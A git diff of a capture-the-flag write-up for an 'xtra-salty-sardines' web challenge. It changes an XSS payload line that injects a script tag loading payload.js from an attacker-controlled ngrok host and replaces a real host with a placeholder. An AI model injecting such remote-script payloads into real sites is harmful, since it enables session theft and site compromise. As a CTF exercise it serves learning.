@@ -35,7 +35,7 @@ function sendBack(){
 #### Payload
 ![image](https://user-images.githubusercontent.com/78451563/166808856-29dd8652-c9a4-4a73-b082-afd198f9f65a.png)</br>
 ![image](https://user-images.githubusercontent.com/78451563/166809657-af371a6d-1017-4bcf-b21f-532eb386e121.png)</br>
-`<h1>"r4nd0m"</h1><script src="https://a479-80-3-68-53.ngrok.io/payload.js"></script>`</br>
+`<h1>"r4nd0m"</h1><script src="https://change-me-plz.ngrok.io/payload.js"></script>`</br>
 ♡ This bypassing payload source is to the `payload.js` hosted on our `ngrok` server</br>
 ♡ When sent our payload to `https://xtra-salty-sardines.web.actf.co/` we should create a directory with our payload inside e.g `/sardines/abcdefg`</br>
 ### Exploitation
